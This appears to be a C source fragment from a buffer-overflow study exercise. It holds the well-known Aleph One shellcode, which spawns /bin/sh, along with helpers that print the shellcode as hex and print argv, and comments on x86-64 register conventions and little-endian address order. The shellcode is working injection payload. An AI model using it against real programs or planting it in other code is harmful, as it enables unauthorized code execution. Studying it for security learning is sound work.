/*
 *  * Aleph One shellcode.
 *   */
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

void print_hexcode(const char *shellcode) {
    printf("Printing Hex Code:\n");
    for (int i = 0; shellcode[i] != '\0'; i += 4) {
        printf("\\x%02x\\x%02x\\x%02x\\x%02x\n",
               (unsigned char)shellcode[i],
               (unsigned char)shellcode[i + 1],
               (unsigned char)shellcode[i + 2],
               (unsigned char)shellcode[i + 3]);
    }
	printf("\n");
}

void print_argv(char *argv[]) {
    printf("Printing char *argv[]:\n");
    while (*argv != NULL) {
        printf("%s\n", *argv);
        argv++;
    }
}

// little endian format should add addresses in backwards
// rbx, rsp, rbp, r12, r13, r14, and r15; while rax, rdi, rsi, rdx, rcx, r8, r9, r10, r11 are scratch registers.
// The return value is stored in the rax register, or if it is a 128-bit value, then the higher 64-bits go in rdx. 
// Optionally, functions push rbp such that the caller-return-rip is 8 bytes above it, and set rbp to the address of the saved rbp. 
// This allows iterating through the existing stack frames. 
